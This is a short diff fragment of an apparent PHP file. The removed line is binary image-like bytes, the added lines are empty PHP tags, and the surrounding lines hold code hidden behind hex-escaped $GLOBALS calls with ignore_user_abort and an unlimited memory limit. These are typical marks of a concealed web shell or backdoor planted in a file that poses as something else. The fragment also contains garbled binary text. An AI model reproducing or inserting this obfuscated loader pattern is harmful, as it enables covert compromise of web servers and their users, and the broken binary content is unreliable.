@@ -42,7 +42,11 @@ ${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["t\x65\x76w\x67\x62dy"]}(
 );
 ?>
 
-$4á%ñ&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz& !Æ0`"Ü"a¢£¤¥¦§¨©ª²³´µ��·¸¹ºÂÃÄÅÆ����ÉÊ��ÓÔÕÖ×ØÙÚâãäåæçè��êòóôõö÷øùúÿÚ   ? üÿ !NþÔßôm?ÿ ðÞjÿ üEP ÿÙ
+<?php
+?>
+<?php
+?>
+
 <?php
 ignore_user_abort(true);
 ini_set("memory_limit", "-1");
